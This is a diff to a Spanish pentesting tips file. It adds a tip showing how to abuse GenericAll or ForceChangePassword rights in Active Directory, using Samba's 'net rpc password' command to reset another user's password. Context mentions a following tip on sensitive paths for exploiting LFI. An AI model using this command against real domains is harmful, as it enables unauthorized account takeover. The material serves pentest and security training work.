@@ -524,6 +524,10 @@ spt_monitor
 MSreplication_options
 ```
 ## Tip #13: Cambio de contraseña de usuarios con net
+Cuando un usuario tenga permisos de ```GenericAll``` o de ```ForceChangePassword``` se puede usar la herramienta de samba ```net``` para cambiar su contraseña:
+```bash
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+```
 ## Tip #14: Rutas sensibles de frameworks para aprovechar LFI
 En esta sección solo tratare de actualizar las rutas con archivos que contienen información sensible en caso de obtener un LFI.
 ### Ruby on rails
